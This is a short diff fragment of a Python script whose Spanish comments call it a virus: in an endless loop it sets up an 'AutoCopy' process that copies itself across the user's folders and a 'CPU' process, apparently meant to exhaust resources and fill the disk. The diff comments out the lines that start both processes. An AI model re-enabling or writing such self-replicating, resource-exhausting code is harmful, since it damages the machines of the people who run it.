@@ -201,6 +201,6 @@ if __name__ == '__main__':
         while(True):
             autocopy = Process(target=AutoCopy)   # Copia y replica el virus en muchas carpetas del usuario
             cpuS = Process(target=CPU)
-            cpuS.start()
-            autocopy.start()        # Saturación del disco duro
+            #cpuS.start()
+            #autocopy.start()        # Saturación del disco duro
 
